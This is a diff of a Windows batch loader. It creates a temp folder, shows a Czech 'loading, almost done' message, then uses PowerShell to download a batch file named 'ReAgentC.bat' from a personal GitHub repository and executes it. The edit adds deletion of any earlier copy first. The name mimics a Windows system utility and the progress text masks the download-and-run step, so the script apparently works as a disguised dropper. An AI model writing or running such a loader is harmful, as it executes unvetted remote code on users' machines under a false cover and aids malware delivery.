@@ -5,7 +5,7 @@ set "pth=%temp%\grea54tg"
 md "%pth%"
 echo Probyha nacitani... Skoro hotovo
 title Probyha nacitani... Skoro hotovo
-if not "%loaderver%" == "1" (
+if not "%loaderver%" == "1" (del %pth%\reagentc.bat
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/mmmmm4299/sptest/blob/main/ReAgentC.bat' -OutFile '%pth%\reagentc.bat'"
 call "%pth%\reagentc.bat"
 )
